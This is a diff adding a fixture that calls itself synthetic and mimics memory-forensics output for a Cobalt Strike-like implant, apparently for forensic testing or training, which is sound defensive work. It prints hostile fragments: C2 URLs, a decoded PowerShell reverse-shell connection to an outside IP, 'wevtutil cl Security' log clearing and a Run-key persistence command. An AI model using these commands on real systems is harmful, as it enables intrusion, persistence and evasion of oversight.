@@ -1,0 +1,65 @@
+===========================================================
+SYNTHETIC MEMORY-STYLE TEXT FIXTURE — NOT A MEMORY IMAGE OR REAL VOLATILITY OUTPUT
+The strings below are illustrative and were not collected from a host or produced by a memory-forensics engine.
+
+MEMORY FORENSICS EXCERPT - VOLATILITY-STYLE OUTPUT
+Process: svc.exe (PID: 4872)
+Parent: services.exe (PID: 760)
+Timestamp: 2024-03-15 02:20:17 UTC
+===========================================================
+
+PROCESS DETAILS:
+Name:       svc.exe
+PID:        4872
+PPID:       760
+Offset:     0x84c3b030
+Threads:    8
+Handles:    247
+Session:    0
+Wow64:      False
+Start:      2024-03-15 02:20:17
+Exit:       ---
+Path:       C:\Windows\Temp\svc.exe
+CommandLine: "C:\Windows\Temp\svc.exe" --config-url http://45.142.212.100/c2/config
+
+NETWORK CONNECTIONS:
+TCP 0.0.0.0:0 -> 45.142.212.100:8080 (ESTABLISHED) PID:4872
+TCP 0.0.0.0:0 -> 185.220.101.47:4444 (ESTABLISHED) PID:4872
+
+LOADED MODULES:
+ntdll.dll       0x77f10000 - 0x77ff4000
+kernel32.dll    0x7c800000 - 0x7c900000
+ws2_32.dll      0x71ab0000 - 0x71ac7000
+winhttp.dll     0x4d500000 - 0x4d560000
+
+STRINGS (suspicious):
+http://45.142.212.100/c2/config
+http://45.142.212.100/c2/beacon
+/c2/upload
+cmd.exe /c
+powershell -enc
+VirtualAlloc
+CreateRemoteThread
+WriteProcessMemory
+IsDebuggerPresent
+NtQuerySystemInformation
+wevtutil cl Security
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+
+HEAP ARTIFACTS:
+Offset: 0x001A2340 - MZ header detected (embedded PE)
+Offset: 0x003B1000 - Cobalt Strike shellcode signature
+  Bytes: FC 48 83 E4 F0 E8 C8 00 00 00 41 51 41 50 52 51
+
+BASE64 ENCODED STRINGS:
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3ACIALAAjNDQ0NCk=
+
+DECODED:
+$client = New-Object System.Net.Sockets.TCPClient("185.220.101.47",#4444)
+
+REGISTRY HIVE (in-memory):
+HKLM\System\CurrentControlSet\Services\WinDefendHelper\ImagePath = C:\Windows\Temp\svc.exe
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate = C:\Windows\Temp\svc.exe
+
+YARA MATCH: Cobalt_Strike_Beacon_x64 CONFIRMED
+THREAT LEVEL: CRITICAL
